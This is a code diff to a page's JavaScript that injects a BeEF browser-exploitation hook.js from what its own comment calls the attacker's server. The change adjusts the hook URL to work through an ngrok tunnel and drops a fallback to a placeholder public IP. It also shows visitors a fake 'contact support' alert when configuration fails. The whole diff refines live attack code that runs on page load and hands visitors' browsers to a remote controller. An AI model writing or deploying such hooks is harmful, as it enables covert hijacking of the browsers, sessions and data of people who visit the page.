@@ -51,21 +51,21 @@
 
             // Dynamically inject BeEF hook.js from attacker's server
             const script = document.createElement("script");
-            script.src = `${beefServer}:3000/hook.js`;
+            // FIXED: No port number needed - ngrok URL already includes everything
+            script.src = `${beefServer}/hook.js`;
             script.onerror = function () {
               console.error("Failed to load BeEF hook - server unreachable");
+              console.error("Attempted URL:", script.src);
             };
             script.onload = function () {
-              console.log("BeEF hook loaded successfully");
+              console.log("BeEF hook loaded successfully from:", script.src);
             };
             document.head.appendChild(script);
           })
           .catch((err) => {
             console.error("Failed to fetch config:", err);
-            // Fallback: try direct connection if API fails
-            const script = document.createElement("script");
-            script.src = "http://YOUR_PUBLIC_IP:3000/hook.js";
-            document.head.appendChild(script);
+            // No fallback - if config fails, it means Vercel setup is wrong
+            alert("Configuration error. Please contact support.");
           });
       }
 
